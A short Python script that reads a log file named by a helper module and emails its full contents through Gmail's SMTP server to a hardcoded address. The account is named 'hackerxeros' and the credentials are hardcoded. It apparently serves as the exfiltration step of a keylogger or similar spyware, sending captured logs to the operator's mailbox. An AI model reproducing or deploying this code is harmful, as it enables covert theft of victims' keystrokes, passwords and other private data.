import smtplib
import filemanager

def main():
    # Specifying the from and to addresses

    sender = 'hackerxeros@gmail.com' # 발신자 이메일
    receiver  = 'hackerxeros@gmail.com' # 수신자 이메일 (자기 자신에게 전송할것이기때문에 동일함)
    username = 'hackerxeros' # 자신의 구글 계정 아이디
    password = 'pass' # 자신의 구글 계정 패스워드

    # Writing the message (this message will appear in the email)
    log = open(filemanager.getlogfilepath(filemanager.getlogfilename()), mode='r', encoding='utf-8').read().encode()

    # Sending the mail

    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(username,password)
    server.sendmail(sender, receiver, log)
    server.quit()

if __name__ == "__main__":
    main()